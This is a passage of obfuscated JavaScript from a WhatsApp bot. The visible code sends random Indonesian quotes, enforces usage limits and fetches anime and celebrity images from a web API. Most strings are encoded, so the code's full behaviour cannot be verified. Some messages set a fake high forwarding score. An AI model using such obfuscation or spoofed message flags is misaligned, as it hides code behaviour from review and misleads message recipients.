3e,0x677,0x2bd)+_0x134458(0x5fc,0x81e,0x11f,0x4a1)+_0x15af3d(0x64d,0x9bb,0x780,0x5c2)+_0x15af3d(0x69a,0x2c9,0x544,0x297)+'kin\x20banyak'+_0x15af3d(0x9f8,0x9d0,0x960,0x938)+_0x134458(0x866,0xb70,0xc92,0x4c6)+_0x134458(0x65b,0xb03,0x478,0xa74)+'k\x20yang\x20kit'+_0x15af3d(0x4a8,0x99c,0x511,0x8a8)+_0x134458(0x7e3,0xc31,0x7ec,0x954)+_0x134458(0x5fb,0x29a,0x500,0xa0e)+_0x15af3d(0x3d8,0x80,0x3ce,0x413)+_0x134458(0x42b,0x758,0x844,0x21e)+_0x15af3d(0x87a,0x5b2,0x428,0xa85)+'kita\x20tahu.'+'\x20Jadi\x20kena'+_0x15af3d(0x34c,0x57f,0x2ae,0x1fe)+'buk\x20belaja'+_0x134458(0x20d,0x4c4,0x385,0x549),_0x15af3d(0x66a,0x86a,0x3fe,0x859)+_0x134458(0x4b9,0x357,0x735,0x226)+'batu\x20oleh\x20'+_0x15af3d(0x753,0x513,0x5a7,0x8c8)+_0x134458(0x54d,0x8ad,0x4bd,0x6ea)+_0x15af3d(0xa0e,0xd78,0x844,0x924)+_0x15af3d(0x6f3,0x539,0x3ca,0x99f)+_0x15af3d(0xadb,0x754,0x9a4,0xcf7)+_0x134458(0x24f,-0x4f,0x3fc,0x40b)+_0x134458(0x5cf,0x127,0x44d,0x5dd)+_0x15af3d(0x87b,0xbbf,0x5d1,0x715)+_0x15af3d(0xc6f,0xb50,0xd87,0xc3c)+_0x134458(0x756,0xb65,0x818,0xb51)+_0x15af3d(0x732,0x3db,0x4c9,0x3b4)+_0x15af3d(0x45c,0x29b,0x30e,0x21f)+_0x134458(0xa29,0x8c5,0xd6a,0x898)+'lempar.”',_0x15af3d(0xbc3,0xdb4,0xabc,0xf9f)+_0x134458(0x22e,-0x275,0x6e4,-0x27a)+'\x20menjadi\x20j'+_0x134458(0x6ee,0x40d,0x537,0xbdb)+_0x15af3d(0xc16,0xd33,0xc3d,0x7dc)+'a\x20menyenan'+_0x134458(0x856,0x6cc,0x885,0x4ac)+_0x15af3d(0x46f,0x60,0x363,0x5ee)+_0x15af3d(0x7ed,0x3a6,0x607,0x6d7),_0x134458(0xaef,0x868,0x8ca,0x687)+_0x134458(0x471,0x847,-0x3a,0xfe)+_0x134458(0x48d,0x556,0x261,0x860)+_0x134458(0x1f5,0x6a0,-0x154,0x5d3)+_0x134458(0x1d4,-0x9b,0x613,0x3a7)+'gar\x20jadi\x20S'+_0x15af3d(0x37c,0x7fa,-0x167,0x6b6)+_0x134458(0xaa7,0x765,0xe65,0xb9f)+_0x15af3d(0x832,0xa55,0xa6f,0x80f)+'ah)\x20&\x20jadi'+_0x134458(0x792,0x344,0x43b,0x752)+_0x15af3d(0x806,0x90c,0xce4,0x92a)+_0x134458(0x801,0x39e,0x4e0,0x488)+_0x134458(0x3c3,0x22b,0x381,0x1a4)+_0x15af3d(0x416,0x8ba,0x83d,0xc0)+'ja).”',_0x134458(0x757,0x8d1,0x6e8,0x37c)+_0x134458(0x79c,0x996,0xb19,0xc7a)+_0x134458(0x8ea,0xa1c,0x61f,0x83f)+_0x134458(0x28a,0x65d,0x3a2,0x45f)+_0x134458(0x752,0x952,0xada,0xb1e)+_0x15af3d(0xb47,0xf47,0x9c7,0x101c)+_0x15af3d(0xbf1,0xc5e,0xc34,0xe91)+'terasa\x20rin'+_0x134458(0x996,0xac1,0xc29,0xe0c)+_0x15af3d(0x725,0x296,0x3b9,0x9d1)+'mengerjaka'+'nnya.”'],kata_lucu_=kata_lucu[Math[_0x134458(0x989,0xd00,0xad3,0x856)](Math[_0x15af3d(0x696,0xa00,0x91b,0xa8f)]()*kata_lucu[_0x134458(0x76b,0x4dc,0xc1e,0x2c7)])],_0x30877d={};_0x30877d[_0x15af3d(0x6ec,0xb92,0x9c4,0x3af)+'t']=_0x15af3d(0x5c2,0x73f,0x23b,0x30f);const _0x281a33={};_0x281a33[_0x15af3d(0xc33,0xa13,0xdb8,0xdc8)]=_0x134458(0x2c0,-0x91,0x37a,-0xf3),_0x281a33['buttonText']=_0x30877d,_0x281a33[_0x134458(0x8ff,0x5bf,0x55a,0xc97)]=0x1;const _0x2f8040={};_0x2f8040[_0x15af3d(0x6ec,0x6dc,0xb8d,0x992)+'t']=_0x15af3d(0x9b0,0xde1,0x8c7,0x759);const _0x125cab={};_0x125cab[_0x15af3d(0xc33,0xf53,0xaea,0x80f)]=''+command,_0x125cab[_0x134458(0x454,0x29c,0x427,0x30b)]=_0x2f8040,_0x125cab[_0x134458(0x8ff,0xbeb,0x564,0x73a)]=0x1;var buttonns=[_0x281a33,_0x125cab];buttonMessage={'contentText':kata_lucu_,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x15af3d(0xb88,0x854,0xc89,0xde5)+_0x15af3d(0x2f6,0x1e7,-0x136,-0x196)+_0x134458(0x269,0x1b1,0x68f,0xd2))+enter+_0x134458(0x7c6,0x8e1,0xa70,0x38e)+sender[_0x15af3d(0x53f,0x581,0x581,0x8d6)]('@')[0x22a5+-0x257e+0x2d9],'buttons':buttonns,'headerType':0x1};const _0x2c7e1a={};_0x2c7e1a['text']='hi',_0x2c7e1a[_0x15af3d(0x8f1,0xdad,0xaec,0x88f)+_0x15af3d(0xc04,0xbb8,0xe1b,0x949)]=0x3b9aca00,_0x2c7e1a['isForwarde'+'d']=!![],_0x2c7e1a[_0x134458(0x4d7,0x7a2,0x6c2,0x8c7)+_0x15af3d(0x5ca,0x646,0x42a,0x1a0)]=!![],_0x2c7e1a['mentionedJ'+'id']=[sender];const _0xadc48={};_0xadc48[_0x15af3d(0x540,0x280,0x940,0x1b3)]='Botwea\x20©2k'+'21',_0xadc48[_0x134458(0x968,0x511,0xa4a,0x59b)+'o']=_0x2c7e1a,_0xadc48[_0x15af3d(0xc2e,0xb36,0xa4e,0xc77)]=ftoko,_0xadc48[_0x134458(0x4d7,0x2a8,0x361,0x1d1)+_0x15af3d(0x5ca,0x76f,0x26b,0x5c9)]=!![],alpha[_0x15af3d(0xad5,0xa3e,0xc2b,0x87c)+'e'](from,buttonMessage,MessageType[_0x15af3d(0x2a4,0x411,-0x24,0x21e)+_0x134458(0x9a3,0x5b3,0xc1d,0x798)],_0xadc48),await limitAdd(sender,limit);break;case _0x134458(0x820,0x54e,0x85d,0xa25)+_0x134458(0x5d8,0x2ea,0x49c,0x8e0):const _0x28b791={};_0x28b791[_0x134458(0x599,0x952,0x7ea,0x1b8)+'t']=_0x15af3d(0x959,0x51d,0x8b8,0x9d2)+'t';const _0x150ce9={};_0x150ce9[_0x15af3d(0xc33,0xd00,0x77d,0xd74)]=_0x15af3d(0x950,0x60e,0xdb9,0x804),_0x150ce9[_0x15af3d(0x5a7,0x4aa,0x586,0x52e)]=_0x28b791,_0x150ce9[_0x134458(0x8ff,0x71a,0xb18,0xb8f)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xa5d,0x86b,0xa0a)](prefix),'©\x20'+ownername,[_0x150ce9]);const longtong=[_0x15af3d(0x65f,0xb0e,0x400,0x50d)+_0x134458(0x92e,0x675,0x777,0xb00)+_0x15af3d(0x68d,0x520,0x513,0x639)+_0x134458(0x746,0xbe9,0xaff,0xb00)+'pada\x20banya'+_0x134458(0xa5f,0xac5,0x60e,0x945)+'an\x20bodohny'+_0x134458(0xb34,0xac5,0xa23,0xb25)+'lihatan','Saat\x20yang\x20'+'paling\x20tep'+_0x134458(0x4dd,0x7c4,0x5c4,0x6fe)+'mat\x20untuk\x20'+_0x134458(0x33a,0x16b,-0x7a,0x7a9)+_0x134458(0x67a,0x88f,0x256,0x7e7)+'telah\x20kopi'+_0x15af3d(0x7b2,0x35d,0x5c7,0x823)+'dibuat',_0x15af3d(0x752,0x315,0x7de,0x530)+_0x15af3d(0x5f9,0x976,0x40b,0xad8)+_0x15af3d(0xa42,0xca2,0xa60,0xe31)+'gan\x20mendid'+_0x134458(0x9f0,0x6df,0xcfb,0x540)+_0x15af3d(0x92f,0x790,0xd86,0x6ac)+_0x15af3d(0x921,0xa4f,0xbf2,0x72b)+'k\x20seorang\x20'+_0x15af3d(0x3ef,0x3b2,0x720,0x5db)+_0x15af3d(0xbf0,0x10a0,0xfb9,0xd01)+_0x134458(0x186,0x644,-0x2cc,0x22a)+'buah\x20kelua'+_0x134458(0x299,0x162,-0x10,0x38b),_0x15af3d(0x684,0x602,0x80e,0x8a6)+_0x15af3d(0x393,0xcf,-0x14e,0x69a)+_0x134458(0x552,0x3e1,0x3ce,0x27b)+_0x15af3d(0x562,0x6a0,0x14a,0x37a)+_0x15af3d(0x37e,0x483,0x5c2,0x7)+_0x15af3d(0x2f7,0x400,0x40b,0x431)+'it\x20per\x20har'+'i',_0x15af3d(0x8a3,0x526,0x79e,0x72b)+_0x134458(0xb24,0x83b,0x9d6,0x895)+_0x134458(0x6e1,0xb67,0x98f,0x852)+_0x134458(0x520,0x597,0x58a,0x130)+_0x15af3d(0x6d5,0x359,0x370,0x5f0)+'ng\x20seharus'+_0x15af3d(0xa28,0xe42,0xea4,0xe94)+_0x15af3d(0x335,0x27,0x515,-0xb1)+_0x15af3d(0x7b8,0xc09,0xbf6,0x648)+_0x134458(0xb19,0xb9a,0x8c2,0xf25),'Saya\x20tidak'+_0x134458(0x3dc,0x1b9,0x387,0x878)+_0x15af3d(0x941,0xcc1,0x7a6,0x880)+_0x15af3d(0x334,-0x1a1,0x5c4,0x5de)+_0x134458(0x647,0x96e,0x7bb,0x3df)+_0x134458(0x4ab,0x198,0x651,0x739)+_0x15af3d(0xc43,0x8cf,0x9d2,0xf2d)+_0x15af3d(0xae7,0x860,0xd44,0xc9f)+_0x134458(0x5ad,0x30b,0x512,0x452)+_0x15af3d(0x36f,-0xe1,0x6e9,0x205)+_0x134458(0x591,0x786,0x8f3,0x7bf)+_0x15af3d(0x638,0x69a,0x422,0x954)+_0x134458(0xa32,0x9fe,0xaa5,0xf23)+'endiri',_0x134458(0x636,0xa27,0x1e0,0x867)+_0x15af3d(0x662,0x866,0x99e,0x5ab)+_0x15af3d(0x76e,0x400,0x9c3,0x910)+_0x134458(0x7e8,0xa9d,0xa38,0x9b9)+_0x15af3d(0x548,0x79b,0x85,0x7a2)+_0x134458(0x5ee,0x472,0x6a9,0x759)+_0x15af3d(0x7c5,0x35c,0x850,0x773)+_0x15af3d(0x6f5,0x383,0x482,0xa23)+_0x134458(0x960,0x769,0xd70,0x752)+_0x15af3d(0x7f8,0xcb0,0xc99,0x82e)+_0x134458(0x5b8,0x440,0x9d1,0x137)+_0x15af3d(0x9c7,0xa00,0xe27,0xbca),_0x134458(0x940,0x618,0x65d,0x869)+'ah\x20pengorb'+_0x134458(0x98c,0x90b,0xb16,0x875)+_0x15af3d(0x57c,0x1b3,0x962,0x601)+_0x134458(0xb1e,0x9f9,0xdf9,0x8cb)+_0x15af3d(0x330,0x44d,0x199,0x206)+_0x15af3d(0x6ef,0x3a8,0xa08,0x9a5)+_0x134458(0xaa6,0x986,0x706,0x763),_0x15af3d(0xc0c,0xf6d,0xf9e,0xa8f)+_0x15af3d(0x8fe,0x6ca,0x851,0x930)+_0x15af3d(0x7f0,0x4f1,0x709,0xc8c)+_0x15af3d(0x7ef,0x81b,0xa5d,0x4fb)+_0x15af3d(0x5fb,0x2a9,0xa46,0x8c9)+'an\x20pacar,\x20'+'lebih\x20baik'+_0x134458(0x5ef,0x9c6,0x91a,0x860)+_0x134458(0x50a,0x9a0,0x1bf,0x816)+'ebelum\x20jad'+'ian',_0x15af3d(0x5df,0x3e3,0x472,0x89f)+'\x20takut\x20sam'+'a\x20istri\x20sa'+_0x134458(0x4e2,0x11f,0x614,0x667)+'aya\x20takuti'+'\x20hanya\x20dua'+'\x20di\x20dunia\x20'+_0x134458(0x81e,0x6a4,0x4f4,0xa6c)+',\x20dan..\x20pa'+_0x134458(0x26a,0x66d,0x438,0x74b)+_0x15af3d(0x9e6,0x5bc,0x60f,0xc7e),_0x134458(0x88a,0xb08,0x857,0xc29)+_0x15af3d(0x41d,0x27e,0x143,0x40)+_0x134458(0x2f8,0x2c1,0x484,0x753)+_0x15af3d(0x8ea,0x454,0x90b,0x759)+_0x15af3d(0xa94,0xe2f,0xb26,0xd48)+_0x134458(0x703,0x57b,0x8c2,0x70c)+_0x134458(0x522,0x5d8,0x96e,0x529)+_0x15af3d(0xac6,0xe25,0x8c8,0x82f)+_0x134458(0x9e0,0x98f,0x635,0xd47)+'tua\x20saya,\x20'+_0x15af3d(0x41c,-0x62,0x49f,0x490)+'saya\x20menja'+'di\x20ringan',_0x15af3d(0x800,0x863,0x68c,0xa09)+_0x134458(0x1e5,0x33d,-0x211,0x3f5)+_0x134458(0x690,0x313,0xae0,0x80e)+_0x15af3d(0xa9c,0xcf3,0xf2a,0xad4)+_0x15af3d(0x4f9,0x22f,0x852,0x879)+_0x134458(0x4f9,0x440,0x918,0x53)+_0x134458(0x401,0x6fb,0x87d,0x63)+_0x15af3d(0x542,0x449,0x788,0x661)+_0x15af3d(0x2ba,-0x220,0x136,0x466)+'lami\x20sekar'+_0x134458(0x25b,0x2c2,0xa5,-0x37)+_0x15af3d(0xa12,0xacf,0x5da,0xcb0)+_0x134458(0x532,0x9a7,0x99f,0x5da),_0x134458(0x51f,0x76a,0x4de,0x19b)+'ut\x20itu\x20pen'+_0x15af3d(0x879,0xc9d,0x8e4,0x495)+_0x15af3d(0xbcb,0xc94,0xfde,0xd36)+_0x134458(0x709,0x751,0x966,0x572)+'an\x20Anda\x20si'+_0x15af3d(0xac8,0x9b4,0x607,0xf4f),_0x15af3d(0x9f1,0xc47,0xaff,0x94d)+'g\x20sukses\x20a'+'dalah\x20lela'+_0x15af3d(0x74d,0x4e0,0xbb9,0x96e)+_0x134458(0x898,0x697,0xb92,0x9e9)+_0x15af3d(0x462,0x3f2,0x93d,0x8f4)+'h\x20banyak\x20u'+_0x134458(0x9d7,0xb85,0xa3c,0xa2f)+_0x15af3d(0x353,0x82f,0x116,0x186)+_0x134458(0x5b6,0x302,0x247,0x233)+_0x15af3d(0x2a1,-0x251,0x6fa,0x2f9)+_0x134458(0x541,0x2a3,0x204,0x7f4)+_0x134458(0x480,0xc4,0x875,0x57a),_0x15af3d(0x9da,0x541,0x599,0xd2e)+_0x15af3d(0x85d,0x6a0,0x923,0xae3)+_0x134458(0x365,0x5ce,0x1ce,0x556)+_0x134458(0x90b,0x849,0x738,0x6ca)+_0x15af3d(0xa15,0xe04,0xad8,0xa2d)+_0x15af3d(0x36c,0x726,0x33f,0x704)+_0x15af3d(0x58d,0xa2a,0x95f,0x61e)+_0x134458(0x91b,0xdf1,0x52b,0xa79)+_0x15af3d(0x2e5,0x5a7,-0x179,0x259),_0x134458(0x4c3,0x4ff,0x877,0x4fb)+'ara\x20tidak\x20'+'akan\x20hancu'+_0x15af3d(0x48c,0x4a2,0x45,0x7ea)+'ibu\x20pengem'+'is\x20yang\x20ad'+_0x134458(0xae1,0xaa6,0x5fd,0x8a0)+_0x15af3d(0x6ad,0x4e2,0x82e,0xb6e)+_0x134458(0xab6,0xd1a,0x732,0xcf5)+_0x15af3d(0xa7c,0xf1b,0x8b5,0x97e)+_0x15af3d(0x45f,0x492,-0x38,0x59b)+_0x134458(0x7e5,0x9f6,0x4a3,0x4c0)+_0x134458(0x754,0x7f6,0x56e,0x7f6)+_0x134458(0x86a,0xc59,0x618,0xb97)+_0x15af3d(0x8ca,0xc5f,0xb1e,0x935)+_0x15af3d(0x2b3,0x21d,-0xee,0x78d)+_0x15af3d(0x7e4,0x8d0,0x548,0x795),_0x15af3d(0xa48,0xdf9,0x5a8,0xb5d)+_0x15af3d(0x5cf,0xa73,0x83d,0x996)+_0x15af3d(0x763,0x5a2,0x891,0x9fd)+_0x134458(0x5b4,0x40f,0x2c5,0x68f)+'sa\x20tidak\x20m'+'akan\x20dan\x20t'+'idak\x20minum'+_0x134458(0x272,0x473,0x549,0x615)+_0x15af3d(0xb52,0x8e8,0x86e,0xfdb)+_0x15af3d(0xa22,0xdb6,0xb01,0x672)+_0x15af3d(0x5a8,0x660,0x482,0x149)+_0x15af3d(0x64e,0x801,0x204,0x366)+_0x134458(0x5a1,0x838,0x3f5,0x355)+'dang\x20berpu'+_0x15af3d(0xb6b,0xf5e,0xf75,0xfc9),_0x15af3d(0x63f,0x32d,0x73f,0x974)+'a\x20bagi\x20wan'+_0x15af3d(0x33b,0x6fc,0x2cb,0x72c)+_0x134458(0x3e0,0x139,0x10a,0x525)+_0x15af3d(0xb73,0x910,0x8bf,0xb8f)+_0x15af3d(0x2ee,-0xc2,0x37c,-0x67)+_0x15af3d(0x2ec,0x529,0x66,0x231)+_0x134458(0x84f,0x558,0x9d8,0xb15),'Orang\x20kaya'+_0x134458(0x9f7,0x6f2,0xc0b,0x559)+_0x15af3d(0x2c6,0x41,0x20c,0x5b3)+_0x134458(0x3ff,0x224,-0x36,0x3f)+_0x134458(0x9ed,0x92b,0x7bf,0x56a)+_0x134458(0x1ca,0xef,0xfa,0xa8)+_0x15af3d(0xc63,0xdcc,0x7c7,0xa7d)+_0x15af3d(0x8fc,0x819,0x855,0x729)+_0x134458(0x840,0x476,0x438,0x880),_0x15af3d(0x2df,-0x1fa,0x58a,0x66)+_0x15af3d(0x596,0x111,0x8af,0x3f7)+_0x15af3d(0xb17,0x9d7,0x824,0xef2)+_0x15af3d(0x2f9,0x468,0x2b9,0x520)+_0x15af3d(0x470,0x7f,0x559,0x491)+_0x15af3d(0x59d,0x23e,0x922,0x2a6)+_0x134458(0x55e,0x858,0x7ac,0x74e)+_0x15af3d(0xc2d,0xd79,0xd7d,0xb8c)+_0x15af3d(0x9a5,0x57b,0x6a2,0x9a3)+_0x15af3d(0x66d,0x4c3,0x396,0x8cc)+_0x15af3d(0x769,0x71e,0x3c9,0x3f2)],longtong_=longtong[Math[_0x134458(0x989,0x60a,0xd16,0xb38)](Math[_0x15af3d(0x696,0xa52,0x27e,0x71f)]()*longtong[_0x15af3d(0x8be,0x9d4,0x638,0xd55)])],_0x5da3ee={};_0x5da3ee[_0x15af3d(0x6ec,0x967,0x9a2,0x5eb)+'t']='☠️\x20Owner\x20';const _0xcc282c={};_0xcc282c['buttonId']=_0x134458(0x2c0,0x78e,0x322,0x7),_0xcc282c[_0x15af3d(0x5a7,0x99f,0x5f6,0xed)]=_0x5da3ee,_0xcc282c['type']=0x1;const _0x506a02={};_0x506a02[_0x15af3d(0x6ec,0x879,0x990,0x4f0)+'t']=_0x15af3d(0x9b0,0xe00,0x509,0xc61);const _0x30fc0e={};_0x30fc0e[_0x134458(0xae0,0x97c,0x943,0xa81)]=''+command,_0x30fc0e[_0x134458(0x454,0x258,0x11b,0x4cd)]=_0x506a02,_0x30fc0e[_0x15af3d(0xa52,0xa0d,0x8b5,0x60f)]=0x1;var buttonns=[_0xcc282c,_0x30fc0e];buttonMessage={'contentText':longtong_,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x15af3d(0xb88,0x773,0x8cf,0x991)+_0x134458(0x1a3,0x5de,0x2e9,-0x192)+_0x134458(0x269,0x6c6,0x193,0x655))+enter+_0x15af3d(0x919,0x91e,0x73d,0xba8)+sender[_0x134458(0x3ec,-0xfe,0x8a1,0x1f4)]('@')[0x1*0x7d3+-0x18d1+0x10fe],'buttons':buttonns,'headerType':0x1};const _0x46b43f={};_0x46b43f['text']='hi',_0x46b43f[_0x134458(0x79e,0x35d,0x61c,0x758)+_0x15af3d(0xc04,0xbd3,0xbcb,0xb0c)]=0x3b9aca00,_0x46b43f[_0x134458(0x435,0x2ac,0x73d,0x560)+'d']=!![],_0x46b43f['sendEpheme'+_0x15af3d(0x5ca,0x3f8,0x5ce,0x7ad)]=!![],_0x46b43f['mentionedJ'+'id']=[sender];const _0x1ccd5a={};_0x1ccd5a[_0x15af3d(0x540,0x863,0x760,0x6ab)]=_0x15af3d(0x63d,0x737,0x98d,0xaa0)+'21',_0x1ccd5a['contextInf'+'o']=_0x46b43f,_0x1ccd5a[_0x15af3d(0xc2e,0xc34,0x831,0xb84)]=ftoko,_0x1ccd5a['sendEpheme'+_0x15af3d(0x5ca,0x255,0x515,0x8f5)]=!![],alpha[_0x134458(0x982,0x892,0x98d,0xa00)+'e'](from,buttonMessage,MessageType[_0x15af3d(0x2a4,0x335,0x406,0x61b)+'sage'],_0x1ccd5a),await limitAdd(sender,limit);break;case _0x15af3d(0x942,0xb71,0x4a6,0x7b4):case _0x134458(0x6cd,0x2db,0x795,0x6db):case _0x134458(0x87f,0x8e2,0x8eb,0xcd0):case _0x134458(0x1cc,-0x299,-0x26b,0x569):case _0x134458(0x850,0xc59,0x7fa,0x588):case'emilia':case _0x134458(0x639,0x9eb,0x22c,0x30b):case _0x134458(0x81b,0x57c,0xa39,0xa93):case _0x134458(0x4b8,0x8bd,0x833,0x48):case _0x15af3d(0xb7f,0xdcf,0xcad,0xdb9):case _0x15af3d(0xa35,0x971,0x634,0x96d)+_0x15af3d(0x78b,0xbe6,0x89e,0x454):case _0x15af3d(0x44f,0x179,0x16e,0x85b)+'ami':case _0x15af3d(0x93a,0x8e6,0xc99,0xa23):case _0x134458(0x78a,0x77b,0x66b,0x58f)+'a':case _0x134458(0x722,0xb33,0x435,0x831)+_0x134458(0x204,0x49b,0x21d,0x50e):case'nakiri_ali'+'ce':case _0x15af3d(0x71b,0x94a,0x744,0x4f1):case'riyas_grem'+'ori':case _0x15af3d(0x2de,0x5c1,-0xb5,0xc9):case _0x134458(0x9be,0x9ea,0x794,0xd0f):case _0x15af3d(0xa41,0xe55,0xe5c,0xa84)+'u':case _0x15af3d(0x53e,0x2e5,0x9f,0x6d7):case _0x15af3d(0x9dc,0x92e,0xb0a,0x644):case'shinka':case _0x134458(0x96e,0xb0a,0xa58,0xbde):case _0x134458(0x9a9,0x4d7,0xe8c,0x640):case _0x15af3d(0x424,0x887,-0x81,-0x57):case _0x15af3d(0x98c,0xb4f,0x8d2,0xdc5):const _0x46d942={};_0x46d942[_0x134458(0x599,0x49f,0x814,0x5da)+'t']='Check\x20Limi'+'t';const _0x440f3a={};_0x440f3a[_0x134458(0xae0,0xa30,0x7f1,0x885)]=_0x15af3d(0x950,0x829,0x659,0x593),_0x440f3a[_0x134458(0x454,0xde,0x1a5,0x4d8)]=_0x46d942,_0x440f3a[_0x134458(0x8ff,0x972,0x489,0x5dd)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x4e6,0x34e,0x51e)](prefix),'©\x20'+ownername,[_0x440f3a]);reply(lang[_0x134458(0x279,0x23b,-0x243,-0x135)]());var anime=_0x134458(0x3a1,0x5b6,0x7d4,-0xfd)+_0x15af3d(0x5af,0x12d,0x92d,0x391)+'.herokuapp'+_0x15af3d(0x515,0x5a6,0x560,0x7be)+_0x134458(0x821,0x594,0xacf,0x759)+command+(_0x15af3d(0xa38,0x931,0xcff,0xa6a)+_0x134458(0x273,0xda,0x454,0x643));let random_anime=await getBuffer(anime);const mediaxxxxxx=await alpha[_0x134458(0xaa4,0xab5,0xf06,0xcbe)+_0x15af3d(0xaf6,0xbb9,0xa6a,0x8e2)](from,random_anime,MessageType['image'],{'thumbnail':Buffer[_0x134458(0x47a,0x162,0x7e2,0x854)](0x1c1*-0xd+-0x2*-0x493+0xda7)});let bacotluxxxxxx=mediaxxxxxx['message']['ephemeralM'+_0x134458(0x84b,0x569,0x429,0xa2b)]?mediaxxxxxx[_0x134458(0x679,0x905,0xaaf,0x763)]['ephemeralM'+'essage']:mediaxxxxxx;const _0x2f21b5={};_0x2f21b5[_0x15af3d(0x6ec,0xaf0,0x63f,0x615)+'t']=_0x134458(0x18a,-0x195,0x23d,-0x19f);const _0x2b8c32={};_0x2b8c32[_0x134458(0xae0,0xef1,0xd95,0xebd)]=_0x134458(0x2c0,-0x1b,-0x157,0x333),_0x2b8c32[_0x15af3d(0x5a7,0x62a,0x63c,0x9e8)]=_0x2f21b5,_0x2b8c32['type']=0x1;const _0x48b87c={};_0x48b87c[_0x134458(0x599,0x1c9,0x695,0x343)+'t']=_0x134458(0x85d,0x9b2,0x84d,0x6ba);const _0x35ef68={};_0x35ef68[_0x134458(0xae0,0x7ee,0xa67,0xf51)]=''+command,_0x35ef68[_0x15af3d(0x5a7,0x545,0x922,0xa3b)]=_0x48b87c,_0x35ef68[_0x134458(0x8ff,0xaf1,0xd6f,0x455)]=0x1;const buttonsxxxxxx=[_0x2b8c32,_0x35ef68],btnxxxxx__={'contentText':lang[_0x134458(0x876,0x3c0,0x3b0,0x86a)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x134458(0x576,0x6fa,0x580,0x550)+_0x134458(0x40a,0x74d,0x3c8,0x73e))+sender[_0x15af3d(0x53f,0x206,0x109,0x6d7)]('@')[0x1c61+0x388+-0x1fe9],'buttons':buttonsxxxxxx,'headerType':0x4,'imageMessage':bacotluxxxxxx[_0x15af3d(0x7cc,0xa1a,0x63a,0xb59)][_0x134458(0x7d2,0x39f,0x420,0x626)+'ge']},_0x1d7d83={};_0x1d7d83['mentionedJ'+'id']=[sender];const _0xfdd43c={};_0xfdd43c[_0x134458(0xadb,0x885,0x60b,0xecd)]=mek,_0xfdd43c[_0x134458(0x968,0xd70,0x7d3,0xdd9)+'o']=_0x1d7d83,alpha[_0x134458(0x982,0xc9e,0x4f4,0x9c6)+'e'](from,btnxxxxx__,MessageType[_0x15af3d(0x2a4,0x329,0x3e5,0x3e6)+_0x134458(0x9a3,0xa3b,0x505,0xa66)],_0xfdd43c)[_0x134458(0x6ff,0xa75,0x355,0x853)](_0x2fd0a6=>{const _0x5b6aa1={'mOxxG':function(_0x5ca056,_0x15b708){return _0x5ca056(_0x15b708);}};_0x5b6aa1['mOxxG'](reply,lang['tryAgain']());}),await limitAdd(sender,limit);break;case _0x15af3d(0xc13,0x86f,0xb54,0xaba):case _0x15af3d(0x7d8,0x52d,0x60d,0x943)+'o':case'huangzitao':case _0x15af3d(0x36a,0xb9,0x296,0x9e):case'jimin':case _0x15af3d(0xc4c,0x1100,0xb19,0x87e):case _0x134458(0x50d,0x9e4,0x8be,0x63c):case'kimjong':case'dohkyungso'+'o':case'kimjunmyeo'+'n':case'kimminseok':case _0x15af3d(0x96b,0xc27,0x970,0xaa2):case _0x15af3d(0x80b,0x6aa,0x57c,0xb2a):case _0x134458(0x630,0x5b9,0x5c1,0x253)+'g':case _0x15af3d(0x37d,0x7e6,0x8,0x31d):case _0x15af3d(0xae2,0xd91,0x61a,0xfc3):case _0x134458(0x4ed,0x8ff,0x2f1,0x175)+'ol':case _0x134458(0x52b,0x2bb,0x817,0x716):case _0x134458(0x7d3,0x435,0x376,0xb48):const _0x5bfbf4={};_0x5bfbf4[_0x134458(0x599,0x496,0x89b,0x2c0)+'t']='Check\x20Limi'+'t';const _0x414d97={};_0x414d97[_0x15af3d(0xc33,0xf00,0xd78,0xe3b)]=_0x15af3d(0x950,0x61c,0xb53,0x6f8),_0x414d97[_0x15af3d(0x5a7,0xdf,0x406,0x72d)]=_0x5bfbf4,_0x414d97[_0x134458(0x8ff,0xde0,0xc4f,0xa42)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xe31,0xd2d,0x973)](prefix),'©\x20'+ownername,[_0x414d97]);reply(lang['wait']());var cogan=await fetchJson(_0x15af3d(0x4f4,0x76d,0x453,0x925)+_0x134458(0x45c,0x297,0x1de,0x86e)+_0x15af3d(0xa7a,0x5d8,0x8f4,0xe9c)+_0x134458(0x7b5,0xc2a,0xc90,0x5e7)+_0x15af3d(0x60f,0x83e,0xa05,0x627)+command+(_0x134458(0x8e5,0x54a,0xba2,0x492)+_0x134458(0x273,0x699,-0x174,0xf7)));let random_cogan=await getBuffer(cogan[_0x15af3d(0x3f4,0x8ba,0x4e1,0x5a6)]);const mediaxxxxx=await alpha[_0x15af3d(0xbf7,0xb46,0xe08,0xa4d)+_0x15af3d(0xaf6,0x6bf,0xe04,0x90b)](from,random_cogan,MessageType['image'],{'thumbnail':Buffer[_0x15af3d(0x5cd,0x47a,0x2fb,0x60b)](-0x1095+-0x1eaa+-0x29*-0x127)});let bacotluxxxxx=mediaxxxxx['message'][_0x134458(0x7f8,0x7fe,0x55e,0x655)+_0x15af3d(0x99e,0x8ea,0x5f6,0x981)]?mediaxxxxx['message'][_0x15af3d(0x94b,0xa90,0x4f0,0x61b)+'essage']:mediaxxxxx;const _0x17f10b={};_0x17f10b[_0x134458(0x599,0x83e,0x668,0xa11)+'t']='🐨\x20Owner';const _0x31126e={};_0x31126e['buttonId']=_0x15af3d(0x413,0x648,0x541,0x77a),_0x31126e[_0x134458(0x454,-0x5f,-0x7d,0x3a3)]=_0x17f10b,_0x31126e[_0x134458(0x8ff,0x87b,0xd70,0xa65)]=0x1;const _0x20485f={};_0x20485f['displayTex'+'t']='Next\x20➡️';const _0x50770c={};_0x50770c[_0x15af3d(0xc33,0xfaf,0xd4c,0xcaa)]=''+command,_0x50770c['buttonText']=_0x20485f,_0x50770c[_0x134458(0x8ff,0xb6f,0xcb5,0x8fe)]=0x1;const 